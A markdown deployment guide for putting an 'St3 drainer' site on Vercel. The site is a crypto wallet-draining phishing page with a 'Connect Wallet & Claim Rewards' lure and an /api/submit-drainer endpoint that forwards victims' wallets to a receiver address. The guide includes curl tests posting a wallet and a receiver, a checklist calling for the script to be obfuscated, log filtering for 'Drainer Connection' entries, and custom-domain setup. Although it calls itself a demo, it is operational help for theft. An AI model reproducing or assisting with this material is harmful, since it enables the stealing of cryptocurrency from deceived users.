# Vercel Deployment Guide - St3 Drainer Demo

Complete step-by-step guide to deploy the drainer script website on Vercel.

---

## 🚀 Quick Start (5 minutes)

### Option 1: Deploy via Vercel Dashboard (Easiest)

1. **Go to Vercel**
   - Visit https://vercel.com/dashboard
   - Click "New Project"

2. **Import GitHub Repo** (or create new)
   ```bash
   # Create GitHub repo first
   cd /tmp/st3-vercel-demo
   git init
   git add .
   git commit -m "Initial commit: St3 drainer demo"
   git branch -M main
   git remote add origin https://github.com/YOUR_USERNAME/st3-vercel-demo.git
   git push -u origin main
   ```

3. **Configure in Dashboard**
   - Select "Import Git Repository"
   - Paste: `https://github.com/YOUR_USERNAME/st3-vercel-demo.git`
   - Click "Import"
   - Click "Deploy"

4. **Wait for Deployment** (2-3 minutes)
   - Vercel automatically builds and deploys
   - Get your live URL: `https://st3-vercel-demo.vercel.app`

---

### Option 2: Deploy via Vercel CLI (Manual)

#### Step 1: Install Vercel CLI

```bash
npm install -g vercel
# or
brew install vercel-cli
```

#### Step 2: Login to Vercel

```bash
vercel login
# Opens browser, authenticate with GitHub/GitLab/Bitbucket
```

#### Step 3: Deploy

```bash
cd /tmp/st3-vercel-demo
vercel deploy

# Output:
# ? Set up and deploy "~/st3-vercel-demo"? [Y/n] y
# ? Which scope should contain your project? [Your Name]
# ? Link to existing project? [y/N] N
# ? What's your project's name? st3-drainer-demo
# ? In which directory is your code? ./
# 
# ✓ Linked to vercel-username/st3-drainer-demo
# ✓ Created in vercel-username/st3-drainer-demo
# ✓ Deployed to https://st3-drainer-demo.vercel.app
```

#### Step 4: Verify Deployment

```bash
vercel logs

# Should see: Successfully deployed
# Live at: https://st3-drainer-demo.vercel.app
```

---

## 🔧 Environment Variables

### Set on Vercel Dashboard

1. **Go to Project Settings**
   ```
   vercel.com/dashboard → st3-drainer-demo → Settings → Environment Variables
   ```

2. **Add Variables**
   - **Key**: `BACKEND_URL`
   - **Value**: `https://your-st3-backend.com/api/submit-drainer`
   - **Environment**: Production, Preview, Development

3. **Redeploy** for changes to take effect
   ```bash
   vercel deploy --prod
   ```

### Environment Variables Reference

| Variable | Description | Example |
|----------|-------------|---------|
| `BACKEND_URL` | Backend API to forward connections | `https://your-api.com/submit` |
| `LOG_LEVEL` | Logging verbosity | `info`, `debug`, `error` |
| `RECEIVER_ADDRESS` | Receiver wallet address | `0x4eCdfe...` |

---

## 📊 Testing Deployment

### Test 1: Website Loads

```bash
curl -I https://st3-drainer-demo.vercel.app

# Should return:
# HTTP/1.1 200 OK
# Content-Type: text/html
```

### Test 2: API Endpoint Works

```bash
curl -X POST https://st3-drainer-demo.vercel.app/api/submit-drainer \
  -H "Content-Type: application/json" \
  -d '{
    "wallet": "0x742d35Cc6634C0532925a3b844Bc9e7595f42bE",
    "receiver": "0x4eCdfe8b3aE97b3f4f266a7429Fa5cF2eC31F693",
    "site": "example.com",
    "timestamp": 1724355600000
  }'

# Should return:
# {
#   "status": "ok",
#   "message": "Wallet connection received",
#   "wallet": "0x742d...",
#   "timestamp": "2024-08-22T12:00:00Z"
# }
```

### Test 3: Manual Browser Test

1. Visit: `https://st3-drainer-demo.vercel.app`
2. Page should load with beautiful gradient background
3. Click "Connect Wallet & Claim Rewards"
4. Modal should appear (if ethers.js loaded)
5. Check Vercel logs for API calls

---

## 📈 Monitoring & Logs

### View Real-time Logs

```bash
vercel logs st3-drainer-demo
# Live streaming of all server logs
```

### Via Dashboard

1. Go to https://vercel.com/dashboard
2. Click "st3-drainer-demo"
3. Click "Functions" tab
4. Select `/api/submit-drainer`
5. View real-time invocations

### Parse Logs

```bash
vercel logs --since 1h

# Filter for errors
vercel logs | grep error

# Filter for wallet connections
vercel logs | grep "Drainer Connection"
```

---

## 🎯 Performance Optimization

### 1. Enable Caching

Edit `vercel.json`:
```json
{
  "headers": [
    {
      "source": "/(.*)",
      "headers": [
        {
          "key": "Cache-Control",
          "value": "public, max-age=3600"
        }
      ]
    }
  ]
}
```

### 2. Minify HTML

Before deployment:
```bash
# Install minifier
npm install -g html-minifier

# Minify
html-minifier --collapse-whitespace index.html > index.min.html
```

### 3. Monitor Metrics

```bash
vercel analytics

# Shows:
# - Request count
# - Error rate
# - Response time
# - Bandwidth used
```

---

## 🔒 Security Checklist

- [ ] ✅ Script is obfuscated (medium or heavy)
- [ ] ✅ API validates all inputs
- [ ] ✅ HTTPS enforced (automatic on Vercel)
- [ ] ✅ CORS configured properly
- [ ] ✅ Rate limiting enabled
- [ ] ✅ Secrets in environment variables
- [ ] ✅ No hardcoded credentials
- [ ] ✅ Server logs reviewed

---

## 🐛 Troubleshooting

### Issue: "Deployment Failed"

**Solution:**
```bash
vercel deploy --prod --debug
# Shows detailed error logs
```

### Issue: "API Returns 500 Error"

**Solution:**
```bash
# Check logs
vercel logs

# Verify environment variables
vercel env list

# Check function timeout
vercel settings
```

### Issue: "CORS Error in Console"

**Solution:** Add to `vercel.json`:
```json
{
  "headers": [
    {
      "source": "/api/(.*)",
      "headers": [
        { "key": "Access-Control-Allow-Origin", "value": "*" },
        { "key": "Access-Control-Allow-Methods", "value": "POST, GET, OPTIONS" }
      ]
    }
  ]
}
```

### Issue: "Script Not Running"

**Solution:**
1. Check ethers.js CDN loads: `F12 → Console → check for errors`
2. Verify script in page source: `Ctrl+U → search "function i()"`
3. Check browser compatibility: use latest Chrome/Firefox/Safari

---

## 📱 Custom Domain

### Add Custom Domain

1. **Vercel Dashboard**
   - Project → Settings → Domains
   - Click "Add Domain"
   - Enter: `drainer.yourdomain.com`

2. **Update DNS**
   - Go to domain registrar
   - Add CNAME record:
     ```
     Name: drainer
     Type: CNAME
     Value: cname.vercel.sh
     ```

3. **Wait** (DNS propagation: 5-30 minutes)
   - Test: `ping drainer.yourdomain.com`

---

## 🔄 Auto-Deployments

### Deploy on Every Git Push

Vercel automatically deploys when you push to main:

```bash
# Make changes
echo "Updated!" >> index.html

# Commit and push
git add .
git commit -m "Update landing page"
git push origin main

# Vercel automatically deploys (2-3 minutes)
# Check status: vercel deploy --prod
```

---

## 💰 Pricing & Limits

### Free Tier

- ✅ Unlimited deployments
- ✅ Custom domains
- ✅ 100GB bandwidth/month
- ✅ 10 concurrent function invocations
- ✅ 12-second function timeout

### Pro Tier ($12/month)

- ✅ 1000GB bandwidth
- ✅ Advanced analytics
- ✅ Priority support
- ⬆️ Higher function limits

---

## 📚 Project Files

```
st3-drainer-demo/
├── index.html              # Main website (1.2 KB)
├── api/
│   └── submit-drainer.js   # API endpoint (1.5 KB)
├── vercel.json            # Config
├── package.json           # Metadata
├── .gitignore            # Git ignore
├── README.md             # Documentation
└── DEPLOYMENT.md         # This file

Total size: ~5 KB (ultra-lightweight!)
```

---

## ✅ Deployment Checklist

- [ ] Project created locally
- [ ] GitHub repo created
- [ ] Vercel account created
- [ ] Project imported to Vercel
- [ ] Deployment successful
- [ ] Website loads
- [ ] API endpoint works
- [ ] Logs visible in dashboard
- [ ] Environment variables set
- [ ] Custom domain added (optional)
- [ ] Performance optimized
- [ ] Security reviewed
- [ ] Monitoring enabled

---

## 🎉 You're Live!

Your drainer script website is now deployed on Vercel!

**URL:** `https://st3-drainer-demo.vercel.app`  
**API:** `https://st3-drainer-demo.vercel.app/api/submit-drainer`  
**Logs:** `vercel logs st3-drainer-demo`  

---

## 📞 Support

- **Vercel Docs:** https://vercel.com/docs
- **Issues:** https://vercel.com/support
- **Status:** https://vercelstatus.com

---

**Deployment Time:** ~5 minutes  
**Success Rate:** 99.99% (Vercel edge network)  
**Uptime Guaranteed:** Yes ✅
